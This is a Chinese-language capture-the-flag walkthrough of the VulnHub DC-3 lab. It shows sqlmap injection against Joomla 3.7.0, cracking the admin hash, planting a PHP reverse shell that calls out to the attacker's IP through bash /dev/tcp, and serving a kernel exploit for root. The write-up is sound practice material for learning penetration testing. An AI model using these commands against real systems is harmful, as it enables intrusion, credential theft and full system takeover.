## 1\. 靶机下载地址

https://www.vulnhub.comentry/dc-32,312/

## 2\. 环境说明

使用VMware Workstation 打开虚拟机，设置网络为NET模式

靶机ip：192.168.10.132

攻击ip：192.168.10.129

## 3\. 信息收集

使用命令：arp-scan -l 发现内网中的主机

![](../Images/653cf88cccae087e77ef4dd553a99185.png)

使用命令：nmap -A -p- 192.168.10.132，扫描端口和对应的详细服务信息

![](../Images/05c6275243b58da1bb067932383e30b4.png)

发现开放80端口，则可以进行网页访问。

![](../Images/93ed06c3c58663ab1c3d21aea815d8e9.png)

根据nmap扫描到的信息，知道网站后台为joomla的cms系统，所以使用joomscan扫描工具进行扫描，得到joomla版本为3.7

joomscan -u http://192.168.10.132

![](../Images/c1eb9d4bd9429ce301b41c9f9478101d.png)

使用searchsploit查找Joomla 3.7.0 版本存在的漏洞，发现存在一个sql注入漏洞

searchsploit Joomla 3.7.0

![](../Images/9b6ffa89e1f76227915d1513408ce071.png)

查看42033.txt文档，得到具体利用方法

cat /usr/share/exploitdb/exploits/php/webapps/42033  

![](../Images/906c7c426cf3a47d084fdeacac5333d7.png)

## 4\. 漏洞利用

根据看到的注入漏洞说明，使用命令

sqlmap -u "http://192.168.10.132/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list\[fullordering\]

注入查询数据库有哪些，查出5个数据库信息

![](../Images/75895646028f281f2ac9b50f6072e19b.png)

查询当前使用的数据库：Joomladb

sqlmap -u "http://192.168.10.132/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" --risk=3 --level=5 --random-agent --current-db -p list\[fullordering\]

![](../Images/8a90d2f8cac607025678eb3e655d3508.png)

查询当前使用数据库的表：筛选出用户表：#\_\_users

sqlmap -u "http://192.168.10.132/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" --tables  -p list\[fullordering\]

![](../Images/18147e9b229398184b3fbad7b1b6ed7c.png)

对#\_users 表进行爆破：

获取列名

sqlmap -u "http://192.168.10.132/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#\_\_users" --columns  -p list\[fullordering\]

![](../Images/8a94ba260481fcf151cd13f36cbe51ed.png)

获取字段

sqlmap  -u "http://192.168.10.132/index.php?option=com\_fields&view=fields&layout=modal&list\[fullordering\]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#\_\_users" -C "name,password" --dump  -p list\[fullordering\]

![](../Images/700e001fd53c53337bea88fa55da5158.png)

将得到的密钥，通过vim命令建立一个文件名为hash的文件，之后使用john破解，

vim hash

John hash

得到用户名和密码：admin/snoopy

![](../Images/0f5b2ef1587636f6df5586809d5eff04.png)

通过dirb扫描到后台目录为：http://192.168.10.132/administrator/index.php

![](../Images/cc524106365492f61369aa8dfda62351.png)

使用注入得到的账号密码，登录成功  

![](../Images/240bdfb1a5dd1df71c9880b464245cff.png)

在Templates模版设置中，找到可编辑的php模版，在模版中添加反弹php的shell的语句，使用nc监听反弹的端口

![](../Images/2894b1b6df8604a80a290f7cf70db778.png)

新建1.php文件，写入

<?php system("bash -c 'bash -i >& /dev/tcp/192.168.10.129/1234 0>&1'"); ?>

![](../Images/a4b03134db7ec66df08af55d4dc63b09.png)

设置好监听之后，浏览器访问：192.168.10.132/templates/beez3/1.php，顺利反弹shell  

![](../Images/09f92d849b83f1a656a61040cf0807f5.png)  

### **内核提权漏洞**

查看kernel版本：uname -a  
查看linux版本：/etc/\*-release

![](../Images/fad460dd815b49e50c851b69d5921dee.png)

使用searchsploit搜索可利用的exp脚本

searchsploit ubuntu 16.04

![](../Images/bde06fc46296984ac5e49278cc5606c0.png)

**靶机获取exp脚本文件**

先将exp下载到kali镜像(攻击机)中

wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip

将下载的压缩包放到/var/www/html/文件夹下并开启http服务

python -m SimpleHTTPServer 8000

在反弹shell的情况下(攻击者连接上了靶机)输入命令将exp下载到靶机环境中

wget http://192.168.10.129:8000/39772.zip

**![](../Images/922c672cf2b923c4303e38f604f39d87.png)**

**exp利用**

解压该文件

unzip 39772.zip

![](../Images/56adb29cb24e83b82c9758ea30176965.png)

再解压刚刚解压出来的文件exploit.tar

tar –xvf exploit.tar

![](../Images/50765f4b6a86855af2a95eedb9a948c7.png)

进入39772/ebpf\_mapfd\_doubleput\_exploit 目录，运行编译文件 compile.sh  

cd ebpf\_mapfd\_doubleput\_exploit

./compile.sh

![](../Images/53cff716d3fa2ae7e05292f9d31adedb.png)

获得最终提权脚本文件doubleput

执行doubleput 文件提权成功

./doubleput

![](../Images/620726e7c4ff3f20b7836791c85e0d9c.png)
